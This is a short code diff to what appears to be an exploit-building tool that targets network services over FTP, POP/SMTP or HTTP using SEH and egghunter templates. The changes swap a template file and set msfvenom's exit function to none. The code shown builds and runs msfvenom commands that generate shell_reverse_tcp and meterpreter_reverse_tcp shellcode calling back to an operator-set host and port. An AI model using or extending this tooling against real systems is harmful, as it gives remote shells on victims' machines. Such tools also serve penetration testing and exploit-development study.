@@ -52,7 +52,7 @@ class System:
                 adapter = Http(config)
 
             if adapter == None:
-                config.mode = System.input("[?] Enter protocol [ftp/popsmtp/http]:")
+                config.mode = System.input("[?] Enter protocol [ftp / popsmtp / http]:")
 
         return adapter
 
@@ -243,7 +243,7 @@ class System:
                 file = "templates/seh.tpl"
 
             if exploittype == "E":
-                file = "templates/classic.tpl"
+                file = "templates/egghunter.tpl"
 
             if os.path.isfile(file):
 
@@ -353,7 +353,7 @@ class System:
 
             msfvenom_cmd = 'msfvenom -p ' + config.platform + '/shell_reverse_tcp lhost=' + config.localip + ' lport=' + str(
                 config.localport) + ' -b "' + "".join(
-                config.badchars) + '" -a x86 --platform ' + config.platform + ' -o shellcode_' + config.platform + ' exitfunc=thread'
+                config.badchars) + '" -a x86 --platform ' + config.platform + ' -o shellcode_' + config.platform + ' exitfunc=none'
             print(msfvenom_cmd)
             stream = os.popen(msfvenom_cmd)
             payload = stream.read()
@@ -361,7 +361,7 @@ class System:
         elif payloadtype == "M":
             msfvenom_cmd = 'msfvenom -p ' + config.platform + '/meterpreter_reverse_tcp lhost=' + config.localip + ' lport=' + str(
                 config.localport) + ' -b "' + "".join(
-                config.badchars) + '" -a x86 --platform ' + config.platform + ' -o shellcode_' + config.platform + ' exitfunc=thread'
+                config.badchars) + '" -a x86 --platform ' + config.platform + ' -o shellcode_' + config.platform + ' exitfunc=none'
             print(msfvenom_cmd)
             stream = os.popen(msfvenom_cmd)
             payload = stream.read()
